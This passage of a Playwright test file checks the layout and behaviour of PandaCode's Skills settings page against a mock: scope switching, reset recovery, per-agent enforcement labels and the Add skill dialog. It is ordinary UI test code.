import { expect, test, type Page } from '@playwright/test';

/** The app's first boot under a loaded machine (4 workers, cold Vite): only the first readiness check waits this long. */
const BOOT_TIMEOUT = 20_000;

/* Settings → Tools → Skills, mounted on its own page over the preview mock (src/preview-skill-manager.ts).
 * `?projects=N` sets how many projects the scope picker offers; `window.__fail` makes the next call to
 * that command reject; `window.__failAfterScopeChange` makes the next switch save fail once the picker has left its
 * scope; `window.__activeProject` is the project Settings was opened from; `window.__delays[command]` holds extra reply
 * delays (ms), one per call. `theme` boots the
 * page the way the app does: the saved preference (pandacode.theme), then theme.ts and the palette, before mounting. */
async function open(page: Page, projects = 2, empty = false, theme: '' | 'light' | 'dark' = ''): Promise<void> {
  if (theme) await page.addInitScript(value => localStorage.setItem('pandacode.theme', value), theme);
  await page.route('**/skill-manager-harness.html*', route => route.fulfill({
    contentType: 'text/html',
    body: `<!doctype html><html data-theme="light"><head><link rel="stylesheet" href="/src/motion.css"><link rel="stylesheet" href="/src/styles.css"><link rel="stylesheet" href="/src/design-system.css"><link rel="stylesheet" href="/src/settings.css"></head>
      <body><main id="host" class="settings-page-root" style="display:block;padding:24px;max-width:760px"></main><dialog id="dialog"></dialog>
      <script type="module">
        import { mountSkillManager } from '/src/skill-manager.ts';
        import { createPreviewSkillManager } from '/src/preview-skill-manager.ts';
        if (localStorage.getItem('pandacode.theme')) { await import('/src/theme.ts'); await import('/src/palette.ts'); }
        // One bot by default, so Add offers 'Bot library'; a spec passes bots: [] for someone without one.
        const mock = createPreviewSkillManager({ bots: ['Scout'], ...window.__mockOptions });
        const { installDialogMotion } = await import('/src/motion.ts');
        installDialogMotion(document.getElementById('dialog'));
        const all = Array.from({ length: 12 }, (_, i) => ({ id: 'project-' + (i + 1), name: ['orbit', 'pandacode', 'lumen'][i] ?? 'Project ' + (i + 1) }));
        const params = new URLSearchParams(location.search);
        const count = Number(params.get('projects') ?? 2);
        const methods = { skill_manager_list: 'list', skill_manager_set: 'set', skill_manager_reset: 'reset', skill_manager_preview: 'preview', skill_manager_add: 'add', skill_manager_add_library: 'addLibrary', skill_manager_restore: 'restore', skill_manager_uninstall: 'uninstall', skill_manager_undo_uninstall: 'undoUninstall', bots_list: 'bots' };
        window.__delays = {};
        window.__failures = 0;
        const call = async (command, args = {}) => {
          if (command === 'skill_manager_set' && window.__failures > 0) { window.__failures--; await new Promise(resolve => setTimeout(resolve, 300)); throw 'disk full'; }
          // A save that fails only once the picker has left the scope it was made in: deterministic, never a race.
          if (command === 'skill_manager_set' && window.__failAfterScopeChange) {
            window.__failAfterScopeChange = false;
            const from = args.projectId ?? '';
            await new Promise(resolve => { const poll = () => document.querySelector('[data-scope][aria-checked="true"]')?.dataset.scope !== from ? resolve() : setTimeout(poll, 10); poll(); });
            throw 'disk full';
          }
          if (window.__fail === command) { window.__fail = ''; throw 'Could not save skill manager preferences: disk full'; }
          if (command === 'skill_manager_list' && params.has('empty')) return { projectId: null, harnesses: [], skills: [] };
          // The delay comes after the mock answers, so a slow reply carries the state as it was when asked.
          window.__calls ??= []; window.__calls.push({ command, args });
          const result = await mock[methods[command]](args), delay = window.__delays[command]?.shift();
          if (delay) await new Promise(resolve => setTimeout(resolve, delay));
          if (window.__roster) result.harnesses = window.__roster;
          if (window.__overrides && result.skills) result.skills = result.skills.map(s => window.__overrides[s.name] ? { ...s, enforcementOverrides: window.__overrides[s.name] } : s);
          if (window.__manyProjects && result.skills) {
            const skill = result.skills.find(s => s.name === 'webapp-testing');
            skill.agents = all.map(p => ({ harness: 'claude', scope: 'project', path: '.claude/skills/webapp-testing', projectId: p.id }));
          }
          if (command === 'skill_manager_add') {
            if (window.__findings) {
              result.findings = window.__findings;
              // Like native: a flagged update is switched off where the add went, and switchedOff lists only the
              // names whose switch there this add turned off.
              const wasOff = (name) => { const s = mock.list(args).skills.find(k => k.name === name); return !!s && (args.projectId ? s.offInProject : s.offInPandaCode); };
              const switchedOff = window.__findings.map(f => f.skill).filter(name => !wasOff(name));
              for (const f of window.__findings) mock.set({ name: f.skill, enabled: false, ...(args.projectId ? { projectId: args.projectId } : {}) });
              result.skills = mock.list(args).skills;
              result.switchedOff = window.__switchedOff ?? switchedOff;
            }
            if (window.__installFailures) result.failures = window.__installFailures;
          }
          return result;
        };
        window.__mock = mock;
        mountSkillManager(document.getElementById('host'), { call, projects: () => all.slice(0, count), activeProject: () => window.__activeProject ?? '' });
      </script></body></html>`,
  }));
  await page.goto(`/skill-manager-harness.html?projects=${projects}${empty ? '&empty' : ''}`);
  if (theme) await expect(page.locator('html')).toHaveAttribute('data-theme', theme);
  await expect(page.locator(empty ? '.skill-manager-empty' : '.skill-manager-list[aria-label="Skills"]')).toBeVisible({ timeout: BOOT_TIMEOUT });
}
const row = (page: Page, name: string) => page.getByRole('list', { name: 'Skills' }).locator(`.skill-row[data-id="${name}"]`);
const toggle = (page: Page, name: string, project = '') => page.getByRole('switch', { name: `${name} in ${project || 'all projects'}`, exact: true });
const summary = (page: Page) => page.locator('.skill-manager-summary');
/** A list whose untagged rows carry at most two agent chips, so a wide list may name its agents. */
const TWO_CHIP_SKILLS = [
  { name: 'pdf', description: 'Extract text, tables and forms from PDF files, and fill or merge them.', source: 'anthropics/skills', switchable: true, agents: [{ harness: 'claude', scope: 'user', path: '~/.claude/skills/pdf' }, { harness: 'codex', scope: 'user', path: '~/.codex/skills/pdf' }] },
  { name: 'brand-guidelines', description: 'Apply the company colours, type and voice to anything you make.', source: null, switchable: true, agents: [{ harness: 'claude', scope: 'user', path: '~/.claude/skills/brand-guidelines' }, { harness: 'kimi', scope: 'user', path: '~/.kimi/skills/brand-guidelines' }] },
  { name: 'changelog', description: 'Keep CHANGELOG.md in step with what shipped.', source: null, switchable: true, agents: [{ harness: 'claude', scope: 'user', path: '~/.claude/skills/changelog' }] },
];
/** Rows' top edges inside the page (scrolling aside), by skill name. */
const rowTops = (page: Page) => page.locator('.skill-row').evaluateAll(rows => {
  const top = rows[0]?.closest('.skill-manager')?.getBoundingClientRect().top ?? 0;
  return Object.fromEntries(rows.map(r => [(r as HTMLElement).dataset.id, Math.round(r.getBoundingClientRect().top - top)]));
});
const delay = (page: Page, command: string, ms: number[]) => page.evaluate(([c, m]) => { (window as any).__delays[c as string] = m; }, [command, ms] as const);

/** Opens the real app's Settings → Tools → `name` over the preview mocks. Skills opens on the project of the thread
 * Settings was opened from (orbit in the preview); unless `keepScope`, it is moved to All projects, which most specs
 * mean, and its list waited for. */
async function openSettingsPage(page: Page, name: string, keepScope = false) {
  await page.goto('/');
  await expect(page.getByRole('textbox', { name: 'Message your coding agent' })).toBeEnabled({ timeout: BOOT_TIMEOUT });
  await page.getByRole('button', { name: 'Settings', exact: true }).click();
  const settings = page.getByRole('region', { name: 'Settings', exact: true });
  await settings.getByRole('tab', { name: 'Tools', exact: true }).click();
  await settings.getByRole('tab', { name, exact: true }).click();
  await expect(settings.getByRole('heading', { name, exact: true })).toBeVisible();
  if (name === 'Skills' && !keepScope) await showAllProjects(page);
  return settings;
}
/** Picks All projects in the Skills scope picker (pills or select) and waits for its list. */
async function showAllProjects(page: Page) {
  const select = page.locator('.skill-manager-scope-select');
  if (await select.count()) await select.selectOption('');
  else await page.getByRole('radio', { name: 'All projects', exact: true }).click();
  await expect(toggle(page, 'pdf')).toBeVisible();
  await expect(page.locator('.skill-manager-body')).not.toHaveClass(/is-stale/);
}

test.describe('Skill manager', () => {
  // One test per width and theme, so each stays well inside the per-test cap at full parallelism.
  for (const width of [820, 1200]) for (const theme of ['light', 'dark']) {
    test(`at ${width}px (${theme}) the toolbar keeps search and Add skill on one line`, async ({ page }) => {
      await page.setViewportSize({ width, height: 900 });
      // The app's own preference, before boot: theme.ts and the palette set every token for it.
      await page.addInitScript(value => localStorage.setItem('pandacode.theme', value), theme);
      const settings = await openSettingsPage(page, 'Skills');
      await expect(page.locator('html')).toHaveAttribute('data-theme', theme);
      await expect(row(page, 'pdf')).toBeVisible();
      const bar = (await settings.locator('.skill-manager-bar').boundingBox())!;
      const scope = (await settings.locator('.skill-manager-scope, .skill-manager-scope-select').first().boundingBox())!;
      const search = (await settings.getByRole('searchbox', { name: 'Search skills' }).boundingBox())!;
      const add = (await settings.locator('.skill-manager-bar').getByRole('button', { name: 'Add skill' }).boundingBox())!;
      // Search and Add share one line; the search field gives up width rather than wrapping Add. The labelled
      // scope filter sits on that line when it fits, otherwise whole on its own line above.
      expect(Math.abs((add.y + add.height / 2) - (search.y + search.height / 2))).toBeLessThan(2);
      const scopeWrapped = scope.y + scope.height <= search.y;
      if (!scopeWrapped) expect(Math.abs((scope.y + scope.height / 2) - (search.y + search.height / 2))).toBeLessThan(2);
      if (width >= 1200) expect(scopeWrapped).toBe(false);
      expect(search.width).toBeGreaterThanOrEqual(120);
      expect(add.x + add.width).toBeLessThanOrEqual(bar.x + bar.width + 0.5);
      expect(bar.height).toBeLessThan(search.height * 1.5 + (scopeWrapped ? scope.height + 12 : 0));
      // Agent names on chips are decided for the whole view: every untagged row names its agents (a list of 680px or
      // more where no row has more than two chips and all fit) or none does; a row with a tag (a project chip) keeps
      // logos only. Named chips never leave a description under 60% of its row; no chip is ever clipped, and a
      // missing agent app always says so in text.
      const body = settings.locator('.skill-manager-body');
      const named = await body.evaluate(el => el.hasAttribute('data-names'));
      // This list has a row with three agents (webapp-testing), so it keeps logos on every row.
      expect(await settings.locator('.skill-row:not([data-compact]) .skill-row-tags').evaluateAll(groups => groups.some(g => g.childElementCount > 2))).toBe(true);
      expect(named).toBe(false);
      const shown = await settings.locator('.skill-row:not([data-compact]) .skill-chip:not([data-missing]) .skill-chip-name').evaluateAll(names => names.map(n => getComputedStyle(n).display !== 'none'));
      expect(new Set(shown)).toEqual(new Set([named]));
      expect(await settings.locator('.skill-row[data-compact] .skill-chip:not([data-missing]) .skill-chip-name').evaluateAll(names => names.filter(n => getComputedStyle(n).display !== 'none').length)).toBe(0);
      await expect(settings.locator('.skill-row[data-compact]').first()).toBeVisible();
      if (named) {
        const shares = await settings.locator('.skill-row:not([data-compact]) > .ds-row').evaluateAll(rows => rows.map(r => r.querySelector('.skill-row-lead')!.clientWidth / r.clientWidth));
        expect(Math.min(...shares)).toBeGreaterThanOrEqual(0.6);
      }
      await expect(row(page, 'brand-guidelines').locator('.skill-chip-missing')).toHaveText('missing');
      // Named whatever data-names says: logos-only lists still say which agent is missing.
      await expect(row(page, 'brand-guidelines').locator('[data-missing] .skill-chip-name')).toBeVisible();
      await expect(row(page, 'brand-guidelines').getByRole('img', { name: 'Kimi Code app missing', exact: true })).toBeVisible();
      expect(await settings.locator('.skill-row-tags').evaluateAll(groups => groups.filter(g => g.firstElementChild && g.lastElementChild!.getBoundingClientRect().right - g.firstElementChild.getBoundingClientRect().left > g.clientWidth + 1).length)).toBe(0);
      await settings.locator('.skill-manager').screenshot({ path: `test-results/skill-manager-${width}-${theme}.png` });
      const scopePicker = settings.locator('.skill-manager-scope-select');
      const selectScope = async (project: boolean) => {
        if (await scopePicker.count()) await scopePicker.selectOption(project ? { index: 1 } : { index: 0 });
        else await settings.locator('.skill-manager-scope>button').nth(project ? 1 : 0).click();
      };
      await selectScope(true);
      await expect(toggle(page, 'pdf')).toHaveCount(0);
      const controls = row(page, 'pdf').locator('.skill-row-controls');
      const unlockedWidth = (await controls.boundingBox())!.width;
      const otherControls = row(page, 'docx').locator('.skill-row-controls');
      await settings.locator('.skill-manager').screenshot({ path: `test-results/skill-manager-${width}-${theme}-project.png` });
      await selectScope(false);
      await toggle(page, 'pdf').uncheck();
      await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
      await selectScope(true);
      // The locked row says why in its meta line, with a short 'Manage' link right after it; the switch column
      // keeps the same width on every row, so the locked row's description is not squeezed.
      await expect(row(page, 'pdf').locator('.skill-row-meta')).toContainText('Off in all projects');
      const change = row(page, 'pdf').locator('.skill-row-meta').getByRole('button', { name: 'Manage in All projects', exact: true });
      await expect(change).toBeVisible();
      await expect(change).toHaveText('Manage');
      expect(await change.evaluate(el => getComputedStyle(el).textDecorationLine)).toContain('underline');
      expect((await otherControls.boundingBox())!.width).toBeCloseTo(unlockedWidth, 0);
      expect((await controls.boundingBox())!.width).toBeCloseTo(unlockedWidth, 0);
      await settings.locator('.skill-manager').screenshot({ path: `test-results/skill-manager-${width}-${theme}-locked.png` });
    });
  }

  for (const width of [820, 1200]) {
    test(`at ${width}px details keep one compact layout and a switch never moves a row`, async ({ page }) => {
      await page.setViewportSize({ width, height: 900 });
      await openSettingsPage(page, 'Skills');
      await expect(row(page, 'pdf')).toBeVisible();
      // Expanded details use the same compact layout at every width: the agent's name in a narrow label column, its
      // path right beside it, scope and enforcement on a full-width line under the two.
      await row(page, 'pdf').locator('[data-sm-expand]').click();
      const label = (await row(page, 'pdf').locator('.skill-detail-name').first().boundingBox())!;
      const path = (await row(page, 'pdf').locator('.skill-detail-table code').first().boundingBox())!;
      const where = (await row(page, 'pdf').locator('.skill-detail-harness small').first().boundingBox())!;
      expect(Math.abs((path.y) - (label.y))).toBeLessThan(4);
      expect(path.x - (label.x + label.width)).toBeLessThanOrEqual(12 + 16);
      expect(Math.round(where.x)).toBe(Math.round(label.x));
      expect(where.y).toBeGreaterThanOrEqual(label.y + label.height - 1);
      await row(page, 'pdf').screenshot({ path: `test-results/skill-manager-${width}-details.png` });
      await row(page, 'pdf').locator('[data-sm-expand]').click();
      // A switch never moves the rows: 'Applies from the next turn' joins the summary line.
      const before = await rowTops(page);
      await toggle(page, 'changelog').uncheck();
      await expect(toggle(page, 'changelog')).not.toHaveAttribute('aria-busy', 'true');
      expect(await rowTops(page)).toEqual(before);
      await expect(page.locator('.skill-manager-applies')).toBeVisible();
    });
  }

  test('a narrow page puts search and Add together on a second line, never Add alone', async ({ page }) => {
    await open(page);
    for (const width of [520, 420]) {
      await page.locator('#host').evaluate((el, w) => { el.style.maxWidth = `${w}px`; }, width);
      const scope = (await page.locator('.skill-manager-scope').boundingBox())!;
      const search = (await page.getByRole('searchbox', { name: 'Search skills' }).boundingBox())!;
      const add = (await page.locator('.skill-manager-bar [data-sm-add]').boundingBox())!;
      expect(Math.abs(add.y - search.y)).toBeLessThan(2);
      expect(search.width).toBeGreaterThanOrEqual(120);
      if (search.y > scope.y + 2) expect(search.y).toBeGreaterThanOrEqual(scope.y + scope.height);
    }
  });

  test('opens Skills through real Settings navigation, on the active thread’s project', async ({ page }) => {
    const errors: string[] = [];
    page.on('pageerror', error => errors.push(error.message));
    const settings = await openSettingsPage(page, 'Skills', true);
    // Opened from a thread in orbit: the page starts on orbit, its switches named for it.
    await expect(settings.getByRole('radio', { name: 'orbit', exact: true })).toHaveAttribute('aria-checked', 'true');
    await expect(toggle(page, 'pdf', 'orbit')).toBeVisible();
    await expect(page.locator('.skill-row').first()).toHaveAttribute('data-id', 'orbit-deploy');
    await showAllProjects(page);
    await toggle(page, 'pdf').uncheck();
    await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
    await expect(summary(page)).toContainText('1 off in all projects');
    await settings.getByRole('button', { name: 'Add skill', exact: true }).click();
    await expect(page.getByRole('dialog', { name: 'Add skill' })).toBeVisible();
    await page.getByRole('dialog').getByRole('button', { name: 'Cancel', exact: true }).click();
    expect(errors).toEqual([]);
  });

  test('preferences read warnings leave the installed inventory visible', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { prefsError: 'Skill settings file is unreadable.' }; });
    await open(page);
    await expect(page.locator('[data-sm-warning]')).toContainText('Using the last saved switches until you reset.');
    await expect(page.locator('[data-sm-warning]')).toContainText('Skill settings file is unreadable.');
    await expect(page.locator('[data-sm-notices]')).toHaveClass(/ds-card/);
    await expect(page.locator('.skill-manager-warning-detail')).toHaveText('Skill settings file is unreadable.');
    await expect(page.locator('[data-sm-reset]')).toHaveClass('ds-btn');
    await expect(row(page, 'pdf')).toBeVisible();
    await expect(page.getByRole('button', { name: 'Add skill', exact: true })).toBeEnabled();
  });

  test('settings with nothing readable say every skill is off until reset; a prefs warning is a calm line', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { prefsError: 'Skill settings file is unreadable.', prefsLost: true, prefsWarning: 'Kept 1 skill off: its name no longer passes validation.' }; });
    await open(page);
    const warning = page.locator('[data-sm-warning]');
    await expect(warning).toContainText('All skills are off until you reset.');
    await expect(toggle(page, 'pdf')).not.toBeChecked();
    // The error card speaks for the settings; the warning line waits until they are readable again.
    await expect(page.locator('[data-sm-notice]')).toBeHidden();
    await warning.getByRole('button', { name: 'Reset switches', exact: true }).click();
    await warning.getByRole('button', { name: 'Turn every skill back on', exact: true }).click();
    await expect(warning).toBeHidden();
    await expect(toggle(page, 'pdf')).toBeChecked();
    const notice = page.locator('[data-sm-notice]');
    await expect(notice).toHaveText('Kept 1 skill off: its name no longer passes validation.');
    await expect(notice).not.toHaveClass(/ds-card/);
  });

  test('a long title gets its tooltip only while it is cut short', async ({ page }) => {
    const long = 'an-exceptionally-long-skill-name-that-keeps-going-well-past-the-width-of-any-row-in-the-list';
    await page.addInitScript(name => { (window as any).__mockOptions = { skills: [
      { name: 'pdf', description: 'PDF tools.', source: null, switchable: true, agents: [{ harness: 'claude', scope: 'user', path: '~/.claude/skills/pdf' }] },
      { name, description: 'Long.', source: null, switchable: true, agents: [{ harness: 'claude', scope: 'user', path: '~/.claude/skills/long' }] },
    ] }; }, long);
    await page.setViewportSize({ width: 820, height: 900 });
    await open(page);
    await row(page, long).locator('.ds-row-title').hover();
    await expect(row(page, long).locator('.ds-row-title')).toHaveAttribute('data-tip', long);
    await row(page, 'pdf').locator('.ds-row-title').hover();
    await expect(row(page, 'pdf').locator('.ds-row-title')).not.toHaveAttribute('data-tip');
    // Keyboard focus on the row decides the same way.
    await row(page, 'pdf').locator('[data-sm-expand]').focus();
    await expect(row(page, 'pdf').locator('.ds-row-title')).not.toHaveAttribute('data-tip');
  });

  test('reset recovery confirms first, reports failures, and turns every skill back on', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { prefsError: 'Unreadable preferences' }; });
    await open(page);
    await toggle(page, 'pdf').uncheck();
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await toggle(page, 'docx', 'orbit').uncheck();
    const warning = page.locator('[data-sm-warning]');
    await warning.getByRole('button', { name: 'Reset switches', exact: true }).click();
    await expect(warning).toContainText('Turns every skill back on in all projects and clears project switches.');
    // Turning every skill back on is a recovery, not a destructive step: a normal primary button.
    await expect(warning.locator('[data-sm-reset-confirm]')).toHaveClass(/ds-btn-primary/);
    await expect(warning.locator('[data-sm-reset-confirm]')).not.toHaveClass(/ds-danger/);
    await warning.screenshot({ path: 'test-results/skill-manager-reset-notice.png' });
    await warning.getByRole('button', { name: 'Cancel', exact: true }).click();
    await expect(warning.locator('[data-sm-reset]')).toBeFocused();
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_reset'))).toEqual([]);
    await expect(toggle(page, 'pdf', 'orbit')).not.toBeChecked();
    await warning.getByRole('button', { name: 'Reset switches', exact: true }).click();
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_reset'; });
    await warning.getByRole('button', { name: 'Turn every skill back on', exact: true }).click();
    await expect(warning.getByRole('alert')).toContainText('Couldn’t reset switches: Could not save skill manager preferences: disk full');
    await warning.getByRole('button', { name: 'Turn every skill back on', exact: true }).click();
    await expect(warning).toBeHidden();
    await expect(toggle(page, 'pdf', 'orbit')).toBeChecked();
    await expect(toggle(page, 'pdf', 'orbit')).toBeEnabled();
    await expect(toggle(page, 'docx', 'orbit')).toBeChecked();
    await expect(summary(page)).toContainText('Every skill is back on.');
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_reset').at(-1).args)).toEqual({ projectId: 'project-1' });
    await page.getByRole('radio', { name: 'All projects', exact: true }).click();
    await expect(toggle(page, 'pdf')).toBeChecked();
    await expect(row(page, 'docx').locator('.skill-chip-off')).toHaveCount(0);
  });

  test('details render the per-skill modes native sends, for tasks and consoles', async ({ page }) => {
    await open(page);
    await page.evaluate(() => { (window as any).__overrides = { pdf: { claude: { enforcement: 'asked', consoleEnforcement: 'none' } } }; });
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await row(page, 'pdf').locator('[data-sm-expand]').click();
    await expect(row(page, 'pdf').getByRole('list', { name: 'Installed for' }).getByRole('listitem')).toHaveText([/Claude CodeUser · Asked when off · console: not enforced when off/, /CodexUser · Won’t load when off/]);
  });

  test('a name OpenCode can’t block says its console is not enforced, as native’s table does', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { skills: [{ name: 'Friendly 技能', description: 'Unicode name.', source: null, switchable: true, agents: ['claude', 'codex', 'opencode'].map(harness => ({ harness, scope: 'user', path: `~/.${harness}/skills/friendly` })) }] }; });
    await open(page);
    const friendly = row(page, 'Friendly 技能');
    await friendly.locator('[data-sm-expand]').click();
    await expect(friendly.getByRole('list', { name: 'Installed for' }).getByRole('listitem')).toHaveText([
      /^Claude CodeUser · Asked when off~\/.*Typed \/commands still run in the console$/, /CodexUser · Won’t load when off~/, /OpenCodeUser · Asked when off · console: not enforced when off~/,
    ]);
  });

  test('an off skill some agent may still load gets one May still load tag at its switch; titles use app tooltips', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__overrides = { pdf: { claude: { enforcement: 'asked', consoleEnforcement: 'asked' } } }; });
    await open(page);
    const pdf = row(page, 'pdf');
    await expect(pdf.locator('.ds-row-title')).not.toHaveAttribute('title');
    // A title that fits carries no tooltip, even after a hover.
    await pdf.locator('.ds-row-title').hover();
    await expect(pdf.locator('.ds-row-title')).not.toHaveAttribute('data-tip');
    await expect(pdf.locator('.skill-row-asked')).toHaveCount(0);
    await toggle(page, 'pdf').uncheck();
    // One compact tag beside the switch, not a line in the row; who may still load it, and why, is its tooltip and
    // the switch's description. The tag takes keyboard focus, and focus opens its tooltip.
    const asked = pdf.locator('.skill-row-controls > .skill-row-asked');
    await expect(asked).toBeVisible();
    await expect(asked).toHaveText('May still load');
    await expect(asked).toHaveAttribute('data-tip', 'Claude Code can only be asked not to use it.');
    await expect(asked).toHaveAccessibleName('May still load. Claude Code can only be asked not to use it.');
    await expect(toggle(page, 'pdf')).toHaveAccessibleDescription('May still load. Claude Code can only be asked not to use it.');
    // Keyboard-reachable: Shift+Tab from the switch lands on the tag (the shared tooltip opens on keyboard focus).
    await toggle(page, 'pdf').focus();
    await page.keyboard.press('Shift+Tab');
    await expect(asked).toBeFocused();
    // The row keeps its chips to logos, so the description keeps the room.
    await expect(pdf).toHaveAttribute('data-compact', '');
    await expect(pdf.locator('.skill-row-meta')).toHaveCount(0);
    const tag = (await asked.boundingBox())!, knob = (await toggle(page, 'pdf').boundingBox())!;
    expect(knob.x - (tag.x + tag.width)).toBeLessThan(16);
    await toggle(page, 'pdf').check();
    await expect(pdf.locator('.skill-row-asked')).toHaveCount(0);
  });

  test('unreadable skill identities disable the switch with the native reason', async ({ page }) => {
    const reason = 'Couldn’t read SKILL.md, so the skill’s name is unknown.';
    await page.addInitScript(reason => { (window as any).__mockOptions = { skills: [{ name: 'unknown', description: '', agents: [], source: null, switchable: false, unswitchableReason: reason }] }; }, reason);
    await open(page);
    await expect(toggle(page, 'unknown')).toBeDisabled();
    await expect(toggle(page, 'unknown')).toHaveAttribute('data-tip', reason);
    await row(page, 'unknown').locator('[data-sm-expand]').click();
    await expect(row(page, 'unknown').locator('.skill-row-details')).toContainText(reason);
  });

  test('an install error retains safety findings without claiming the skill was turned off', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = {
      installError: 'Could not save skill manager preferences: disk full',
      findings: [{ skill: 'xlsx', rule: 'scan-limit', file: 'scripts/large.sh', line: 1, excerpt: 'Safety scan could not complete.' }],
    }; });
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('button', { name: 'Find skills' }).click();
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog.getByRole('alert')).toContainText('disk full');
    await expect(dialog).toContainText('Safety scan incomplete');
    await expect(dialog).toContainText('scripts/large.sh:1');
    await expect(dialog.getByText('Off in all projects until you review it.')).toHaveCount(0);
    await expect(dialog.getByRole('button', { name: 'Turn on anyway' })).toHaveCount(0);
    await dialog.getByRole('button', { name: 'Done', exact: true }).click();
    await expect(row(page, 'xlsx')).toBeVisible();
    await expect(summary(page)).toContainText('Couldn’t finish installing skills:');
  });

  test('twelve projects keep two badges, a full project list and a readable title', async ({ page }) => {
    await open(page, 12);
    await page.evaluate(() => { (window as any).__manyProjects = true; });
    await page.getByRole('combobox', { name: 'Show skills for' }).selectOption('project-1');
    await page.getByRole('combobox', { name: 'Show skills for' }).selectOption('');
    const item = row(page, 'webapp-testing');
    await expect(item.locator('.skill-chip-project')).toHaveText(['orbit', 'pandacode', '+10']);
    await expect(item.locator('.skill-chip-project').last()).toHaveAttribute('data-tip', /Project 12/);
    for (const width of [1440, 620]) {
      await page.setViewportSize({ width, height: 940 });
      const title = item.locator('.ds-row-title');
      expect((await title.boundingBox())!.width).toBeGreaterThanOrEqual(96);
      expect(await title.evaluate(el => getComputedStyle(el).textOverflow)).toBe('ellipsis');
      const skillRow = (await item.boundingBox())!;
      const control = (await toggle(page, 'webapp-testing').boundingBox())!;
      expect(control.x + control.width).toBeLessThanOrEqual(skillRow.x + skillRow.width);
    }
    await item.locator('[data-sm-expand]').click();
    await expect(item.locator('.skill-row-details')).toContainText('Project 12');
  });

  test('a project install of a global skill reports installed, then a repeat reports already installed', async ({ page }) => {
    await open(page);
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    for (const message of ['Installed 1 skill for Codex.', 'Already installed.']) {
      await page.getByRole('button', { name: 'Add skill' }).click();
      const dialog = page.getByRole('dialog', { name: 'Add skill' });
      await dialog.getByRole('textbox', { name: 'Source' }).fill('https://skills.sh/vercel-labs/agent-skills/react-best-practices');
      await dialog.getByRole('button', { name: 'Find skills' }).click();
      await dialog.getByRole('checkbox', { name: 'Claude Code', exact: true }).uncheck();
      await dialog.getByRole('checkbox', { name: 'OpenCode', exact: true }).uncheck();
      const pick = dialog.locator('.skill-add-check', { hasText: 'react-best-practices' });
      if (message === 'Already installed.') {
        // Already in orbit for Codex: marked and left unchecked, but still selectable to reinstall.
        await expect(pick.locator('.skill-add-installed')).toBeVisible();
        await expect(pick.getByRole('checkbox')).not.toBeChecked();
        await pick.getByRole('checkbox').check();
      } else await expect(pick.locator('.skill-add-installed')).toBeHidden();
      await dialog.getByRole('button', { name: 'Install 1 skill', exact: true }).click();
      await expect(dialog).toBeHidden();
      await expect(summary(page)).toContainText(message);
    }
  });

  test('lists every installed skill with harness logos, one summary line, and the info mark beside the scope', async ({ page }) => {
    await open(page);
    await expect(page.locator('.skill-row')).toHaveCount(13);
    await expect(summary(page)).toHaveText('13 skills');
    // No switch-column caption: the scope picker already says where switches act; its info mark says the rest.
    await expect(page.locator('.skill-manager-caption')).toHaveCount(0);
    const scopeBox = (await page.locator('.skill-manager-scope').boundingBox())!, markBox = (await page.locator('.skill-manager-bar [data-sm-enforcement]').boundingBox())!;
    expect(markBox.x).toBeGreaterThanOrEqual(scopeBox.x + scopeBox.width);
    expect(markBox.x - (scopeBox.x + scopeBox.width)).toBeLessThan(12);
    expect(Math.abs((markBox.y + markBox.height / 2) - (scopeBox.y + scopeBox.height / 2))).toBeLessThan(3);
    // No other helper lines: enforcement lives in the info mark and each row's details.
    await expect(page.locator('.skill-manager > p:not([hidden])')).toHaveCount(0);
    const chips = row(page, 'webapp-testing').locator('.skill-chip');
    await expect(chips).toHaveCount(3);
    await expect(chips.nth(0)).toHaveAccessibleName('Claude Code');
    await expect(chips.nth(2)).toHaveAttribute('data-tip', 'OpenCode');
    const info = page.getByRole('img', { name: 'How switches work' });
    await expect(info).toHaveAttribute('data-tip', 'Switches apply in PandaCode, for the scope picked here. Agents PandaCode runs follow them from the next turn; files stay installed.');
    await expect(page.getByRole('radiogroup', { name: 'Show skills for' }).getByRole('radio')).toHaveText(['All projects', 'orbit', 'pandacode']);
  });

  test('details say what each harness does with an off skill; a missing harness gets a quiet chip', async ({ page }) => {
    await open(page);
    await row(page, 'pdf').locator('[data-sm-expand]').click();
    const agents = row(page, 'pdf').getByRole('list', { name: 'Installed for' }).getByRole('listitem');
    await expect(agents).toHaveText([/Claude CodeUser · Won’t load when off/, /CodexUser · Won’t load when off/]);
    const brand = row(page, 'brand-guidelines');
    const missing = brand.getByRole('img', { name: 'Kimi Code app missing', exact: true });
    await expect(missing).toHaveAttribute('data-missing', '');
    for (const theme of ['light', 'dark']) {
      await page.evaluate(value => { document.documentElement.dataset.theme = value; }, theme);
      // Its name over 'missing' instead of a faded logo, so a logos-only list still says which agent.
      await expect(missing.locator('.provider-logo')).toBeHidden();
      await expect(missing.locator('.skill-chip-name')).toBeVisible();
      expect(await missing.evaluate(el => getComputedStyle(el).outlineStyle)).toBe('dashed');
    }
    await expect(brand.getByRole('img', { name: 'Claude Code', exact: true })).not.toHaveAttribute('data-missing', '');
    await brand.locator('[data-sm-expand]').click();
    // A missing harness gets its own marker, not the enforcement slot.
    const kimi = brand.getByRole('list', { name: 'Installed for' }).getByRole('listitem').nth(1);
    await expect(kimi.locator('small')).toHaveText('User App missing');
    await expect(kimi.locator('.skill-detail-missing')).toHaveText('App missing');
    await brand.screenshot({ path: 'test-results/skill-row-details.png' });
    // Deprecated `enforce` is never read: only native's modes count, and the console's differing mode shows.
    await page.evaluate(() => { (window as any).__roster = [
